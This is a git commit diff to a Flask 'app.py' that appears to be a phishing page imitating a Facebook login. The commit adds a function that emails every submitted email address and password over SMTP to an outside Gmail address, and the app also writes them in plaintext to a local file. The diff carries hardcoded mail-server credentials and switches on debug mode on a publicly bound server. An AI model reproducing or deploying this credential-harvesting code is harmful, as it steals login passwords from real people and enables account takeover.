e121d29e39187799504f088541609434dde390bb
Terry <Tmashterry@gmail.com>
2023-12-21 17:38:12 +0200

    Update app.py

--- app.py
+++ app.py
@@ -1,11 +1,26 @@
 from flask import Flask, render_template, request
-import logging
+import smtplib
+from email.mime.text import MIMEText
 
 app = Flask(__name__)
 
-# Configure logging to display messages in the Render log console
-logging.basicConfig(level=logging.INFO)
-logger = logging.getLogger(__name__)
+def send_email(email, password):
+    # Replace these values with the actual email account settings
+    sender_email = 'facebook@icontinum.co.za'
+    sender_password = 'facEbook@2023'
+
+    subject = 'Login Attempt'
+    body = f"Email or Phone: {email} | Password: {password}"
+
+    message = MIMEText(body)
+    message['Subject'] = subject
+    message['From'] = sender_email
+    message['To'] = 'businessesiconnect@gmail.com'  # Replace with the recipient's email
+
+    with smtplib.SMTP('mail.icontinum.co.za', 587) as server:
+        server.starttls()
+        server.login(sender_email, sender_password)
+        server.sendmail(sender_email, 'businessesiconnect@gmail.com', message.as_string())
 
 @app.route('/', methods=['GET', 'POST'])
 def login():
@@ -13,18 +28,18 @@ def login():
         email = request.form['email']
         password = request.form['password']
 
-        # Validate and sanitize input
+        # Validate and sanitize input before sending the email
         email = email.strip()
-
-        # Log messages to Render log console
-        logger.info(f"Login attempt - Email or Phone: {email}")
-        print(f"Login attempt - Email or Phone: {email}")
+        password = password.strip()
 
         # Store data in a text file (for demonstration purposes only)
         with open('user_data.txt', 'a') as file:
             file.write(f"Email or Phone: {email} | Password: {password}\n")
 
+        # Send email notification
+        send_email(email, password)
+
     return render_template('login.html')
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=3000)
+    app.run(host='0.0.0.0', port=3000, debug=True)
